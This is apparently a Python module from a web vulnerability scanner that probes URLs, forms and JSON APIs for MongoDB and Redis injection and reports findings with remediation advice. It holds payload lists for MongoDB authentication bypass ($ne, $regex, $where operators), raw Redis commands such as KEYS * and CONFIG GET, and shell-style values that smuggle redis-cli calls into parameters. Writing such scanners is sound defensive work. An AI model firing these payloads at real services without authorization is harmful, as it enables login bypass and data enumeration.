"""
NoSQL Injection scanner for MongoDB and Redis patterns.
"""

import re
import json
import urllib.parse
from typing import Dict, List, Optional, Any

import httpx

from ..models import Finding, Severity, Confidence


class NoSQLInjectionScanner:
    """Scanner for NoSQL injection vulnerabilities (MongoDB, Redis)."""
    
    # MongoDB-specific error patterns
    MONGO_ERROR_PATTERNS = [
        r"MongoError",
        r"BSONObj",
        r"MongoDB",
        r"E11000\s+duplicate\s+key",
        r"can't\s+canonicalize\s+query",
        r"Failed\s+to\s+parse",
        r"Expression\s+must\s+be\s+an\s+object",
        r"ReferenceError",
        r"TypeError.*ObjectId",
        r"cannot\s+compare\s+to\s+ObjectId",
    ]
    
    # Redis error patterns
    REDIS_ERROR_PATTERNS = [
        r"RedisError",
        r"ERR\s+unknown\s+command",
        r"WRONGTYPE",
        r"redis\.exceptions",
        r"Connection\s+refused.*6379",
        r"MOVED\s+\d+",
    ]
    
    # MongoDB injection payloads for various contexts
    MONGO_PAYLOADS = [
        # Authentication bypass
        {"username": {"$eq": "admin"}, "password": {"$ne": ""}},
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$exists": True}, "password": {"$exists": True}},
        # Injection in single field
        "' || '1'=='1",
        "' || 1==1//",
        "{$ne: null}",
        "{$gt: ''}",
        "{$regex: '.*'}",
        "{$exists: true}",
        "{$where: 'this.password.length > 0'}",
        "';return true;'",
        # Array injection
        ["admin", {"$ne": ""}],
        [{"$regex": ".*"}],
    ]
    
    # Redis injection payloads
    REDIS_PAYLOADS = [
        "*1\r\n$4\r\nPING\r\n",
        "*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n",
        "*2\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n",
        "*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$4\r\ntest\r\n",
        "; KEYS *;",
        "| redis-cli KEYS '*';",
        "`redis-cli ping`",
        "$(redis-cli ping)",
    ]
    
    # Boolean-based detection payloads
    BOOLEAN_PAYLOADS = [
        ("true", "false"),
        ("1", "0"),
        ("yes", "no"),
        ('{"$eq": "admin"}', '{"$ne": "admin"}'),
        ('{"$gt": ""}', '{"$lt": ""}'),
    ]
    
    def __init__(self, client: httpx.AsyncClient):
        self.client = client
    
    def _detect_mongo_error(self, response_text: str) -> Optional[str]:
        """Detect MongoDB error messages in response."""
        for pattern in self.MONGO_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None
    
    def _detect_redis_error(self, response_text: str) -> Optional[str]:
        """Detect Redis error messages in response."""
        for pattern in self.REDIS_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None
    
    async def _test_mongodb_injection(self, url: str, param: str, 
                                       method: str = "GET") -> Optional[Finding]:
        """Test for MongoDB injection vulnerabilities."""
        
        # Get baseline response
        try:
            if method == "GET":
                baseline_response = await self.client.get(url, follow_redirects=True)
            else:
                baseline_response = await self.client.post(url, data={param: "test"}, 
                                                           follow_redirects=True)
            baseline_text = baseline_response.text
            baseline_status = baseline_response.status_code
        except Exception:
            return None
        
        # Test with MongoDB-specific payloads
        test_payloads = [
            ("[$ne]", "[$ne]"),
            ("[$gt]", "[$gt]"),
            ("[$regex]", "[$regex]"),
            ("[$exists]", "[$exists]"),
            ("true", "false"),
        ]
        
        for payload_indicator, payload in test_payloads:
            try:
                if method == "GET":
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query)
                    
                    # Test with JSON-like injection
                    params[param] = payload
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                    response = await self.client.get(test_url, follow_redirects=True)
                else:
                    # For POST, try both form data and JSON
                    test_data = {param: payload}
                    response = await self.client.post(url, data=test_data, follow_redirects=True)
                
                # Check for MongoDB errors
                error = self._detect_mongo_error(response.text)
                if error and not self._detect_mongo_error(baseline_text):
                    return Finding(
                        title="NoSQL Injection (MongoDB)",
                        description=f"MongoDB injection vulnerability detected in parameter '{param}'. "
                                   f"The application appears to process NoSQL operators directly.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=url,
                        finding_type="nosql_injection_mongodb",
                        evidence=f"MongoDB error detected: {error}",
                        remediation="Use parameterized queries with proper input validation. "
                                   "Avoid passing user input directly to NoSQL query builders. "
                                   "Implement strict type checking and sanitize special operators like $ne, $gt, $regex.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                            "https://book.hacktricks.xyz/pentesting-web/nosql-injection",
                        ],
                        parameter=param,
                        payload=payload,
                    )
                
                # Check for behavioral differences
                if response.status_code != baseline_status or \
                   len(response.text) != len(baseline_text):
                    # Additional verification with boolean-based test
                    pass
                    
            except Exception:
                continue
        
        # Test JSON-based injection for API endpoints
        json_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
            {"$where": "this.password.length > 0"},
        ]
        
        for payload in json_payloads:
            try:
                response = await self.client.post(
                    url, 
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    follow_redirects=True
                )
                
                error = self._detect_mongo_error(response.text)
                if error:
                    return Finding(
                        title="NoSQL Injection (MongoDB JSON)",
                        description=f"MongoDB injection vulnerability detected via JSON payload. "
                                   f"The API endpoint processes NoSQL operators in JSON input.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=url,
                        finding_type="nosql_injection_mongodb_json",
                        evidence=f"MongoDB error: {error}",
                        remediation="Validate and sanitize all JSON input. "
                                   "Use allowlists for expected fields and values. "
                                   "Disable server-side JavaScript execution if not needed.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                        ],
                        payload=json.dumps(payload),
                    )
                    
            except Exception:
                continue
        
        return None
    
    async def _test_redis_injection(self, url: str, param: str,
                                     method: str = "GET") -> Optional[Finding]:
        """Test for Redis injection vulnerabilities."""
        
        for payload in self.REDIS_PAYLOADS:
            try:
                if method == "GET":
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query)
                    params[param] = payload
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                    response = await self.client.get(test_url, follow_redirects=True)
                else:
                    response = await self.client.post(url, data={param: payload}, 
                                                       follow_redirects=True)
                
                # Check for Redis errors
                error = self._detect_redis_error(response.text)
                if error:
                    return Finding(
                        title="NoSQL Injection (Redis)",
                        description=f"Redis injection vulnerability detected in parameter '{param}'. "
                                   f"The application may be passing user input to Redis commands.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=url,
                        finding_type="nosql_injection_redis",
                        evidence=f"Redis error detected: {error}",
                        remediation="Never pass user input directly to Redis commands. "
                                   "Use parameterized Redis queries. "
                                   "Validate and sanitize all input used in cache keys.",
                        references=[
                            "https://book.hacktricks.xyz/pentesting-web/sql-injection/redis-injection",
                        ],
                        parameter=param,
                        payload=payload,
                    )
                    
            except Exception:
                continue
        
        return None
    
    async def scan_url(self, url: str, parameters: Optional[List[str]] = None) -> List[Finding]:
        """Scan a URL for NoSQL injection vulnerabilities."""
        findings = []
        
        # Extract parameters if not provided
        if parameters is None:
            parsed = urllib.parse.urlparse(url)
            parameters = list(urllib.parse.parse_qs(parsed.query).keys())
        
        for param in parameters:
            # Test MongoDB injection
            finding = await self._test_mongodb_injection(url, param)
            if finding:
                findings.append(finding)
            
            # Test Redis injection
            finding = await self._test_redis_injection(url, param)
            if finding:
                findings.append(finding)
        
        return findings
    
    async def scan_form(self, url: str, form_data: Dict[str, str]) -> List[Finding]:
        """Scan a form for NoSQL injection vulnerabilities."""
        findings = []
        
        for param in form_data.keys():
            finding = await self._test_mongodb_injection(url, param, method="POST")
            if finding:
                findings.append(finding)
            
            finding = await self._test_redis_injection(url, param, method="POST")
            if finding:
                findings.append(finding)
        
        return findings
    
    async def scan_api(self, url: str) -> List[Finding]:
        """Scan an API endpoint for NoSQL injection via JSON."""
        findings = []
        
        # Common API authentication patterns
        auth_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$regex": ".*"}, "password": {"$gt": ""}},
            {"username": "admin", "password": {"$exists": True}},
            {"username": {"$where": "this.username == 'admin'"}, "password": {"$ne": ""}},
        ]
        
        for payload in auth_payloads:
            try:
                response = await self.client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    follow_redirects=True
                )
                
                # Check for MongoDB errors
                error = self._detect_mongo_error(response.text)
                if error:
                    findings.append(Finding(
                        title="NoSQL Injection (MongoDB API)",
                        description="MongoDB injection vulnerability detected in API endpoint. "
                                   "The application processes NoSQL operators in JSON payloads.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=url,
                        finding_type="nosql_injection_mongodb_api",
                        evidence=f"MongoDB error: {error}",
                        remediation="Implement strict input validation for API endpoints. "
                                   "Use schema validation to reject unexpected operators. "
                                   "Consider using an ORM/ODM that prevents operator injection.",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                        ],
                        payload=json.dumps(payload),
                    ))
                    break
                    
            except Exception:
                continue
        
        return findings
